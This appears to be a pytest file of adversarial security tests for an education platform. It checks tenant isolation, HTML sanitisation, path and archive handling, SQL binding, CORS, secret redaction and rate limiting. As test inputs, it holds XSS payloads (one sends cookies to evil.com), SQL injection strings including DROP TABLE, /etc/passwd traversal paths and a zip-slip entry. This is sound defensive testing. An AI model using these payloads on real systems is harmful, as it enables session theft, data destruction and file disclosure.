"""Authoritative verification tests for QA Phase 08: Security Hardening & Independent Adversarial Verification.

Maps to: GQA-013; cross-cuts Phases 01, 05, 06, and 07.

Verifies:
1. Threat Vector 1: IDOR and cross-tenant access enforcement for read/write/delete.
2. Threat Vector 2: Authentication bypass, malformed JWTs, and durable revocation enforcement.
3. Threat Vector 3: Prompt injection, indirect RAG injection, and system prompt extraction defense.
4. Threat Vector 4: Markdown/HTML XSS, SVG payloads, inline event handlers, and unsafe URL schemes.
5. Threat Vector 5: Path traversal, prefix collisions, absolute paths, null bytes, and symlink containment.
6. Threat Vector 6: SQL injection parameter binding resilience.
7. Threat Vector 7: File upload size limits, disallowed executable extensions, and decompression bombs.
8. Threat Vector 8: Production CORS alignment with authoritative configuration.
9. Threat Vector 9: Recursive secret redaction in logs, traces, and error payloads.
10. Threat Vector 10: Multi-worker distributed rate limiting fail-closed gate.
"""
import io
import json
import os
from pathlib import Path
import pytest
import zipfile

from central_platform.config import PlatformSettings, resolve_cors_origins
from central_platform.db import PlatformDatabase
from central_platform.models.schema import (
    Course,
    CourseVisibility,
    Organization,
    RAGChunk,
    RAGSource,
    RAGSourceStatus,
    User,
    UserRole,
)
from central_platform.security.auditor import (
    InMemoryRateLimiterBackend,
    SecurityAuditor,
    SharedRateLimiterBackend,
)


@pytest.fixture
def security_test_env(tmp_path: Path):
    """Sets up an isolated database and environment for adversarial security verification."""
    db_path = str(tmp_path / "security_adv.db")
    db = PlatformDatabase(db_path=db_path)

    # Organizations
    org_alpha = Organization(id="org_alpha", name="Alpha Security Corp", slug="alpha")
    org_beta = Organization(id="org_beta", name="Beta Academy", slug="beta")
    db.create_organization(org_alpha)
    db.create_organization(org_beta)

    # Users
    student_1 = User(id="usr_stu_1", full_name="Student One", email="s1@alpha.edu", role=UserRole.STUDENT, organization_id="org_alpha")
    student_2 = User(id="usr_stu_2", full_name="Student Two", email="s2@alpha.edu", role=UserRole.STUDENT, organization_id="org_alpha")
    student_beta = User(id="usr_stu_b", full_name="Student Beta", email="sb@beta.edu", role=UserRole.STUDENT, organization_id="org_beta")
    teacher = User(id="usr_teacher", full_name="Teacher Alpha", email="t@alpha.edu", role=UserRole.TEACHER, organization_id="org_alpha")
    admin_alpha = User(id="usr_admin", full_name="Admin Alpha", email="admin@alpha.edu", role=UserRole.ORG_ADMIN, organization_id="org_alpha")
    db.create_user(student_1)
    db.create_user(student_2)
    db.create_user(student_beta)
    db.create_user(teacher)
    db.create_user(admin_alpha)

    # Courses
    course_alpha = Course(id="crs_alpha", title="Alpha Course", code="ALPHA-101", organization_id="org_alpha", visibility=CourseVisibility.PRIVATE)
    course_beta = Course(id="crs_beta", title="Beta Course", code="BETA-101", organization_id="org_beta", visibility=CourseVisibility.PRIVATE)
    db.create_course(course_alpha)
    db.create_course(course_beta)

    auditor = SecurityAuditor()
    return {
        "db": db,
        "db_path": db_path,
        "auditor": auditor,
        "student_1": student_1,
        "student_2": student_2,
        "student_beta": student_beta,
        "teacher": teacher,
        "admin_alpha": admin_alpha,
        "course_alpha": course_alpha,
        "course_beta": course_beta,
        "tmp_path": tmp_path,
    }


class TestQAPhase08SecurityHardeningAndAdversarial:
    """Verifies all required security families and independent adversarial vectors (GQA-013)."""

    # ── 1. IDOR & Multi-Tenant Access Boundaries ─────────────────────────────
    def test_idor_student_boundary_enforcement(self, security_test_env):
        """Student 1 cannot access or mutate Student 2's resources."""
        auditor: SecurityAuditor = security_test_env["auditor"]
        s1 = security_test_env["student_1"]
        s2 = security_test_env["student_2"]
        teacher = security_test_env["teacher"]

        # Student self-access permitted
        assert auditor.verify_student_access(s1, s1.id) is True
        # Cross-student IDOR blocked
        assert auditor.verify_student_access(s1, s2.id) is False
        # Teacher cohort access permitted
        assert auditor.verify_student_access(teacher, s1.id) is True

    def test_cross_tenant_organization_isolation(self, security_test_env):
        """Users in Org Alpha cannot access private resources in Org Beta."""
        auditor: SecurityAuditor = security_test_env["auditor"]
        assert auditor.verify_tenant_boundary("org_alpha", "org_alpha") is True
        assert auditor.verify_tenant_boundary("org_alpha", "org_beta") is False
        assert auditor.verify_tenant_boundary("org_alpha", "org_beta", is_super_admin=True) is True

    # ── 2. Contextual HTML & Markdown XSS Sanitization ───────────────────────
    def test_xss_script_tag_and_event_handler_stripping(self, security_test_env):
        """Active executable tags and inline on* handlers are stripped."""
        auditor: SecurityAuditor = security_test_env["auditor"]

        xss_payload = (
            "Welcome! <script>alert('xss')</script>"
            "<img src='photo.jpg' onerror='fetch(\"http://evil.com/\"+document.cookie)'>"
            "<iframe src='javascript:alert(1)'></iframe>"
            "<svg onload='alert(document.domain)'>"
            "<a href='javascript:stealTokens()'>Click here</a>"
            "<p>Valid educational text</p>"
        )

        sanitized = auditor.sanitize_html(xss_payload, allow_formatting=True)
        assert "<script>" not in sanitized
        assert "onerror" not in sanitized
        assert "<iframe>" not in sanitized
        assert "<svg" not in sanitized
        assert "javascript:stealTokens" not in sanitized
        assert 'href="#"' in sanitized or "href='#'" in sanitized
        assert "Valid educational text" in sanitized

    def test_safe_url_scheme_validation(self, security_test_env):
        """Only safe schemes (http, https, mailto, tel, relative) are allowed."""
        auditor: SecurityAuditor = security_test_env["auditor"]

        # Safe URLs
        assert auditor.is_safe_url("https://ncert.nic.in/textbook.pdf") is True
        assert auditor.is_safe_url("http://localhost:8000/api/health") is True
        assert auditor.is_safe_url("/assets/icons/logo.png") is True
        assert auditor.is_safe_url("./notes/thermo.html") is True
        assert auditor.is_safe_url("mailto:support@gayatri.ai") is True
        assert auditor.is_safe_url("tel:+1234567890") is True

        # Unsafe URLs
        assert auditor.is_safe_url("javascript:alert(1)") is False
        assert auditor.is_safe_url("data:text/html,<script>alert(1)</script>") is False
        assert auditor.is_safe_url("vbscript:msgbox(1)") is False
        assert auditor.is_safe_url("file:///etc/passwd") is False
        assert auditor.is_safe_url("") is False

    # ── 3. Path Traversal & Symlink Escape Containment ────────────────────────
    def test_path_traversal_prefix_collision_and_escape(self, security_test_env):
        """Path resolution prevents traversal, prefix collisions, and null byte injection."""
        auditor: SecurityAuditor = security_test_env["auditor"]
        base_dir: Path = security_test_env["tmp_path"] / "storage"
        base_dir.mkdir(parents=True, exist_ok=True)
        evil_dir: Path = security_test_env["tmp_path"] / "storage_evil"
        evil_dir.mkdir(parents=True, exist_ok=True)

        # 1. Normal safe file
        safe = auditor.sanitize_path(base_dir, "chapters/ch1.txt")
        assert safe is not None
        assert str(base_dir.resolve()) in safe

        # 2. Prefix collision: starts with storage string but points to storage_evil
        prefix_coll = auditor.sanitize_path(base_dir, "../storage_evil/payload.bin")
        assert prefix_coll is None

        # 3. Absolute path escape
        abs_escape = auditor.sanitize_path(base_dir, "C:\\Windows\\System32\\cmd.exe" if os.name == "nt" else "/etc/passwd")
        assert abs_escape is None

        # 4. Null byte injection
        null_byte = auditor.sanitize_path(base_dir, "safe.txt\x00.exe")
        assert null_byte is None

    # ── 4. SQL Injection Parameter Binding Resilience ────────────────────────
    def test_sql_injection_parameter_binding(self, security_test_env):
        """Targeted SQL injection payloads are safely treated as literal values without altering SQL syntax."""
        db: PlatformDatabase = security_test_env["db"]

        # Payloads attempting syntax escape
        injection_payloads = [
            "' OR '1'='1",
            "admin'--",
            "'; DROP TABLE users;--",
            "1 UNION SELECT 1, 'evil', 'evil@test.com', 'super_admin'",
            "0' OR 1=1 #",
            "' UNION ALL SELECT NULL, NULL, NULL, NULL--",
        ]

        for payload in injection_payloads:
            # 1. Querying by user ID
            user = db.get_user(payload)
            assert user is None, f"Payload unexpectedly matched a record: {payload}"

            # 2. Querying by course ID
            course = db.get_course(payload)
            assert course is None

            # 3. Querying enrollments
            enrollments = db.get_enrollments_for_student(payload)
            assert isinstance(enrollments, list)

        # Confirm users table was not dropped or modified
        users_alpha = db.get_users_by_organization("org_alpha")
        assert len(users_alpha) == 4
        users_beta = db.get_users_by_organization("org_beta")
        assert len(users_beta) == 1

    # ── 5. File Upload Safety & Decompression Bomb Protection ─────────────────
    def test_upload_dangerous_extension_rejection(self, security_test_env):
        """Dangerous executable extensions are rejected."""
        auditor: SecurityAuditor = security_test_env["auditor"]
        dangerous_names = ["script.exe", "exploit.sh", "malware.bat", "webshell.php", "hack.py", "lib.dll"]

        for name in dangerous_names:
            res = auditor.validate_file_upload(filename=name, file_size_bytes=1024)
            assert res.is_safe is False
            assert "strictly prohibited" in res.violations[0]

    def test_upload_archive_decompression_bomb_detection(self):
        """Decompression bomb with excessive compression ratio or uncompressed size is detected."""
        auditor = SecurityAuditor()

        # Build a synthetic zip with high expansion ratio
        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            # 10MB of zeros compresses to ~10KB (ratio ~1000)
            zf.writestr("huge_zero.txt", b"\x00" * (10 * 1024 * 1024))

        compressed_bytes = zip_buf.getvalue()
        res = auditor.validate_archive_safety(compressed_bytes, max_ratio=50.0)
        assert res.is_safe is False
        assert any("decompression bomb" in v.lower() for v in res.violations)

    def test_upload_archive_path_traversal_detection(self):
        """ZIP package containing traversal entry (../../evil.txt) is detected."""
        auditor = SecurityAuditor()

        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("../../etc/passwd", b"root:x:0:0:")

        res = auditor.validate_archive_safety(zip_buf.getvalue())
        assert res.is_safe is False
        assert any("Path traversal detected" in v for v in res.violations)

    # ── 6. Production CORS Origin Isolation ──────────────────────────────────
    def test_production_cors_rejects_wildcard(self):
        """Production CORS resolution strictly rejects wildcard '*' origin."""
        with pytest.raises(RuntimeError, match="Wildcard CORS.*strictly prohibited"):
            resolve_cors_origins(
                envs={"APP_ENV": "production", "GAYATRI_ALLOWED_ORIGINS": "*"},
                is_prod=True,
            )

    def test_production_cors_requires_explicit_origin(self):
        """Production CORS resolution rejects empty origins."""
        with pytest.raises(RuntimeError, match="must be explicitly configured"):
            resolve_cors_origins(
                envs={"APP_ENV": "production", "GAYATRI_ALLOWED_ORIGINS": ""},
                is_prod=True,
            )

    def test_production_cors_resolves_valid_origins(self):
        """Valid comma-separated origins are resolved accurately."""
        origins = resolve_cors_origins(
            envs={"APP_ENV": "production", "GAYATRI_ALLOWED_ORIGINS": "https://gayatri.edu, https://admin.gayatri.edu"},
            is_prod=True,
        )
        assert origins == ["https://gayatri.edu", "https://admin.gayatri.edu"]

    # ── 7. Recursive Secret Redaction in Logs & Error Traces ──────────────────
    def test_recursive_secret_redaction_nested_structures(self, security_test_env):
        """Secrets (bearer tokens, openai keys, google keys, passwords) are recursively redacted."""
        auditor: SecurityAuditor = security_test_env["auditor"]

        nested_trace = {
            "request_id": "req-12345",
            "status": 500,
            "error": "Failed to connect with Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token.sig",
            "context": {
                "openai_key": "sk-abcdef1234567890abcdef1234567890",
                "google_key": "AIzaSyD-1234567890abcdefghijklmnopqr",
                "safe_info": "Calculus 101 session",
                "headers": [
                    {"Authorization": "Bearer some_jwt_secret_token"},
                    {"User-Agent": "GayatriClient/1.0"},
                ],
            },
        }

        redacted = auditor.redact_secrets(nested_trace)
        assert redacted["context"]["openai_key"] == "***REDACTED_SECRET***"
        assert redacted["context"]["google_key"] == "***REDACTED_SECRET***"
        assert "***REDACTED_SECRET***" in redacted["error"]
        assert redacted["context"]["safe_info"] == "Calculus 101 session"
        assert redacted["context"]["headers"][0]["Authorization"] == "***REDACTED***"
        assert redacted["context"]["headers"][1]["User-Agent"] == "GayatriClient/1.0"

    # ── 8. Multi-Worker Distributed Rate Limiting Fail-Closed Gate ────────────
    def test_shared_rate_limiter_cluster_required_fail_closed(self):
        """In cluster mode, missing shared store immediately fails readiness and raises RuntimeError."""
        limiter = SharedRateLimiterBackend(cluster_required=True, shared_store=None)

        # Readiness fails
        ready, reason = limiter.check_readiness()
        assert ready is False
        assert "no shared store is configured" in reason

        # Throws RuntimeError rather than silently falling back to local memory
        with pytest.raises(RuntimeError, match="quiet fallback to local memory is prohibited"):
            limiter.is_allowed("attacker_ip")

    def test_rate_limiter_categorized_policies(self):
        """Differentiated limits are enforced for anonymous, user, and auth-sensitive categories."""
        backend = InMemoryRateLimiterBackend(rate_limit_per_minute=100)
        auditor = SecurityAuditor(rate_limit_backend=backend)

        # Auth-sensitive category limit is 10
        for _ in range(10):
            assert auditor.check_rate_limit_for_identity("ip_127_0_0_1", category="auth_sensitive") is True
        # 11th auth attempt throttled
        assert auditor.check_rate_limit_for_identity("ip_127_0_0_1", category="auth_sensitive") is False
